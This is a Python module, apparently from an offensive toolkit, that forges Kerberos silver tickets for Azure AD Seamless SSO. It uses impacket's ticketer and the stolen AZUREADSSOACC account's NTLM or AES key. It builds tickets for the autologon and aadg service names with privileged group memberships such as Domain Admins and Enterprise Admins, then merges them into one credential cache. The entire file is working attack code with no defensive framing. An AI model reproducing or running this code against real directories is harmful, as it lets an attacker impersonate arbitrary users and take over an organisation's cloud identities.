"""Silver ticket forging and ccache merging for Seamless SSO."""

import argparse
import os
import sys

from impacket.krb5.ccache import CCache

AUTOLOGON_SPN = "HTTP/autologon.microsoftazuread-sso.com"
AADG_SPN = "HTTP/aadg.windows.net.nsatc.net"

DEFAULT_GROUPS = "513,512,520,518,519"
TICKET_DURATION_DAYS = "1"


def _build_ticketer_options(
    spn: str,
    domain_sid: str,
    user_rid: int,
    adssoacc_ntlm: str | None = None,
    adssoacc_aes: str | None = None,
) -> argparse.Namespace:
    return argparse.Namespace(
        spn=spn,
        domain_sid=domain_sid,
        user_id=str(user_rid),
        nthash=adssoacc_ntlm,
        aesKey=adssoacc_aes or None,
        groups=DEFAULT_GROUPS,
        duration=TICKET_DURATION_DAYS,
        extra_sid=None,
        extra_pac=True,
        old_pac=False,
        impersonate=None,
        request=False,
        user=None,
        password=None,
        hashes=None,
        keytab=None,
        dc_ip=None,
        domain=None,
        ts=False,
        debug=False,
    )


def _forge_single_ticket(
    user: str,
    domain: str,
    spn: str,
    domain_sid: str,
    user_rid: int,
    adssoacc_ntlm: str | None,
    adssoacc_aes: str | None,
    work_dir: str,
) -> str:
    ticketer_path = os.path.join(
        os.path.dirname(sys.executable),
        "ticketer.py",
    )
    if os.path.isfile(ticketer_path):
        import importlib.util

        spec = importlib.util.spec_from_file_location("_ticketer", ticketer_path)
        ticketer_mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(ticketer_mod)
        TICKETER = ticketer_mod.TICKETER
    else:
        from impacket.examples.ticketer import TICKETER

    options = _build_ticketer_options(
        spn=spn,
        domain_sid=domain_sid,
        user_rid=user_rid,
        adssoacc_ntlm=adssoacc_ntlm,
        adssoacc_aes=adssoacc_aes,
    )

    original_cwd = os.getcwd()
    os.chdir(work_dir)
    try:
        ticketer = TICKETER(user, "", domain, options)
        ticketer.run()
    finally:
        os.chdir(original_cwd)

    return os.path.join(work_dir, f"{user}.ccache")


def merge_ccaches(path_a: str, path_b: str, output_path: str) -> str:
    ccache_a = CCache.loadFile(path_a)
    ccache_b = CCache.loadFile(path_b)

    for cred in ccache_b.credentials:
        ccache_a.credentials.append(cred)

    ccache_a.saveFile(output_path)
    return output_path


def forge_tickets(
    domain: str,
    domain_sid: str,
    user: str,
    user_rid: int,
    work_dir: str,
    adssoacc_ntlm: str | None = None,
    adssoacc_aes: str | None = None,
    spns: list[str] | None = None,
) -> str:
    if spns is None:
        spns = [AUTOLOGON_SPN, AADG_SPN]

    if len(spns) == 1:
        return _forge_single_ticket(
            user=user,
            domain=domain,
            spn=spns[0],
            domain_sid=domain_sid,
            user_rid=user_rid,
            adssoacc_ntlm=adssoacc_ntlm,
            adssoacc_aes=adssoacc_aes,
            work_dir=work_dir,
        )

    temp_paths = []
    for i, spn in enumerate(spns):
        path = _forge_single_ticket(
            user=user,
            domain=domain,
            spn=spn,
            domain_sid=domain_sid,
            user_rid=user_rid,
            adssoacc_ntlm=adssoacc_ntlm,
            adssoacc_aes=adssoacc_aes,
            work_dir=work_dir,
        )
        tmp = path + f".spn{i}"
        os.rename(path, tmp)
        temp_paths.append(tmp)

    combined_path = os.path.join(work_dir, "combined.ccache")
    merge_ccaches(temp_paths[0], temp_paths[1], combined_path)
    for i in range(2, len(temp_paths)):
        merge_ccaches(combined_path, temp_paths[i], combined_path)

    for tmp in temp_paths:
        os.unlink(tmp)

    return combined_path
